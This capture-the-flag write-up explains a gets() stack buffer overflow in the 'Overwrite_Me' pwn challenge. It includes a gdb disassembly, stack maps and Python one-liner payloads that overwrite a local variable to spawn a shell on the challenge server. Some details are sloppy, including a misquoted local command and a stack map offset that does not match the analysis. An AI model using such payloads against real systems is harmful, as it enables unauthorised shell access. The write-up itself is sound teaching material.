# Overwrite_Me

> Pwn | 100 points
-------------------------

## Problem Statement
> Do you have what it takes to overwrite me??  
> Connect using nc  13.233.99.37 1009  
> [File](./chall)

## Analysis

```gdb
Dump of assembler code for function main:
   0x080491a2 <+0>:	lea    ecx,[esp+0x4]
   0x080491a6 <+4>:	and    esp,0xfffffff0
   0x080491a9 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080491ac <+10>:	push   ebp
   0x080491ad <+11>:	mov    ebp,esp
   0x080491af <+13>:	push   ebx
   0x080491b0 <+14>:	push   ecx
   0x080491b1 <+15>:	sub    esp,0x30
   0x080491b4 <+18>:	call   0x80490e0 <__x86.get_pc_thunk.bx>
   0x080491b9 <+23>:	add    ebx,0x2e47
   0x080491bf <+29>:	mov    eax,DWORD PTR [ebx-0x8]
   0x080491c5 <+35>:	mov    eax,DWORD PTR [eax]
   0x080491c7 <+37>:	push   0x0
   0x080491c9 <+39>:	push   0x2
   0x080491cb <+41>:	push   0x0
   0x080491cd <+43>:	push   eax
   0x080491ce <+44>:	call   0x8049080 <setvbuf@plt>
   0x080491d3 <+49>:	add    esp,0x10
   0x080491d6 <+52>:	mov    eax,DWORD PTR [ebx-0x4]
   0x080491dc <+58>:	mov    eax,DWORD PTR [eax]
   0x080491de <+60>:	push   0x0
   0x080491e0 <+62>:	push   0x2
   0x080491e2 <+64>:	push   0x0
   0x080491e4 <+66>:	push   eax
   0x080491e5 <+67>:	call   0x8049080 <setvbuf@plt>
   0x080491ea <+72>:	add    esp,0x10
   0x080491ed <+75>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080491f4 <+82>:	sub    esp,0xc
   0x080491f7 <+85>:	lea    eax,[ebp-0x2c]
   0x080491fa <+88>:	push   eax
   0x080491fb <+89>:	call   0x8049030 <gets@plt>
   0x08049200 <+94>:	add    esp,0x10
   0x08049203 <+97>:	cmp    DWORD PTR [ebp-0xc],0x1234
   0x0804920a <+104>:	jne    0x804922c <main+138>
   0x0804920c <+106>:	sub    esp,0x4
   0x0804920f <+109>:	push   0x0
   0x08049211 <+111>:	push   0x0
   0x08049213 <+113>:	lea    eax,[ebx-0x1ff8]
   0x08049219 <+119>:	push   eax
   0x0804921a <+120>:	call   0x8049070 <execve@plt>
   0x0804921f <+125>:	add    esp,0x10
   0x08049222 <+128>:	sub    esp,0xc
   0x08049225 <+131>:	push   0x0
   0x08049227 <+133>:	call   0x8049050 <exit@plt>
   0x0804922c <+138>:	sub    esp,0xc
   0x0804922f <+141>:	lea    eax,[ebx-0x1ff0]
   0x08049235 <+147>:	push   eax
   0x08049236 <+148>:	call   0x8049040 <puts@plt>
   0x0804923b <+153>:	add    esp,0x10
   0x0804923e <+156>:	mov    eax,0x0
   0x08049243 <+161>:	lea    esp,[ebp-0x8]
   0x08049246 <+164>:	pop    ecx
   0x08049247 <+165>:	pop    ebx
   0x08049248 <+166>:	pop    ebp
   0x08049249 <+167>:	lea    esp,[ecx-0x4]
   0x0804924c <+170>:	ret
End of assembler dump.
```


* The disassembly looks very complicated but we are only intrested in the following part
     >```gdb
     >   0x080491f7 <+85>:	lea    eax,[ebp-0x2c]
     >   0x080491fa <+88>:	push   eax
     >   0x080491fb <+89>:	call   0x8049030 <gets@plt>
     >   0x08049200 <+94>:	add    esp,0x10
     >   0x08049203 <+97>:	cmp    DWORD PTR [ebp-0xc],0x1234
     >   0x0804920a <+104>:	jne    0x804922c <main+138>
     >   0x0804920c <+106>:	sub    esp,0x4
     >   0x0804920f <+109>:	push   0x0
     >   0x08049211 <+111>:	push   0x0
     >   0x08049213 <+113>:	lea    eax,[ebx-0x1ff8]
     >   0x08049219 <+119>:	push   eax
     >   0x0804921a <+120>:	call   0x8049070 <execve@plt>
     > ```

* Now let's try to understand what's hapening here
  >```gdb
     >   0x080491f7 <+85>:	lea    eax,[ebp-0x2c]
     >   0x080491fa <+88>:	push   eax
     >   0x080491fb <+89>:	call   0x8049030 <gets@plt>
  >```
  > Gets takes input and starts writing at address [ebp-0x2c]

    >```gdb
    >   0x08049203 <+97>:	cmp    DWORD PTR [ebp-0xc],0x1234
    >   0x0804920a <+104>:	jne    0x804922c <main+138>
    >```
    > Now value at address [ebp-0xc] is compared with 0x1234 and if they aren't equal
    > program exits ( jumps to <main+138> )

    >```gdb
    >   0x08049213 <+113>:	lea    eax,[ebx-0x1ff8]
    >   0x08049219 <+119>:	push   eax
    >   0x0804921a <+120>:	call   0x8049070 <execve@plt>
    >```
    > If the values are equal the program the program copies a string from somewher
    > [ebx-0x1ff8] in the memory and executes that string

* Hmmm.... Lets see what the program is trying to executes
    > ```gdb
    > gdb$ x/s $ebx-0x1ff8
    > 0x804a008:	"/bin/sh"
    > gdb$
    > ```
    > So the program executes a shell if  the conditions  are met



## Solution

So far we know that if we can overwrite the mempry address [ebp-0x0xc] with 0x1234
we will get a shell.

The problem is we have no direct way of controling [ebp-0x0xc]

* Let's  take a look at the stack
    >```
    >Stack map
    >[ebp-0x30]    [ -- -- -- -- ]
    >[ebp-0x2c]    [ -- -- -- -- ]
    >[ebp-0x28]    [ -- -- -- -- ]
    >[ebp-0x24]    [ -- -- -- -- ]
    >[ebp-0x20]    [ -- -- -- -- ]
    >[ebp-0x1c]    [ -- -- -- -- ]
    >[ebp-0x18]    [ -- -- -- -- ]
    >[ebp-0x14]    [ -- -- -- -- ]
    >[ebp-0x10]    [ -- -- -- -- ]
    >[ebp-0xc ]    [ -- -- -- -- ]
    >[ebp-0x8 ]    [ -- -- -- -- ]
    >[ebp-0x4 ]    [ -- -- -- -- ]
    >[  bp    ]    [ -- -- -- -- ]
    >[   ret  ]    [ -- -- -- -- ]
    >```
    >   Now we cotrol [ebp-0x2c] through gets


* after writing 32 characters the buffer gets full and anything that we write further
will overwrite [ebp-0xc]
* lets see how the stack looks if we supply 32 A's and 4 B's as input

    >```
    >Stack map
    >[ebp-0x30]    [ 41 41 41 41 ]
    >[ebp-0x2c]    [ 41 41 41 41 ]
    >[ebp-0x28]    [ 41 41 41 41 ]
    >[ebp-0x24]    [ 41 41 41 41 ]
    >[ebp-0x20]    [ 41 41 41 41 ]
    >[ebp-0x1c]    [ 41 41 41 41 ]
    >[ebp-0x18]    [ 41 41 41 41 ]
    >[ebp-0x14]    [ 41 41 41 41 ]
    >[ebp-0x10]    [ 41 41 41 41 ]
    >[ebp-0xc ]    [ 42 42 42 42 ]
    >[ebp-0x8 ]    [ -- -- -- -- ]
    >[ebp-0x4 ]    [ -- -- -- -- ]
    >[   bp   ]    [ -- -- -- -- ]
    >[   ret  ]    [ -- -- -- -- ]
    >```
    >  we see [ebp-0xc] is overwritten  with all those B characters

## Exploit

The following exploits will give the shell
* On local machine
    >   ```shell
    >   $ (python -c "print 'A' * 32 + '\x12\x34'[::-1];cat) " | ./chall
    >   ```
* For remote server
    >   ```shell
    >   $ (python -c "print 'A' * 32 + '\x12\x34'[::-1] ";cat) | nc 13.233.99.37 1009
    >ls
    >chall
    >flag
    >run.sh
    >cat flag
    >inctf{Ov3Wr1t3_15_FUN}
    >   ```

## Flag
`inctf{Ov3Wr1t3_15_FUN}`




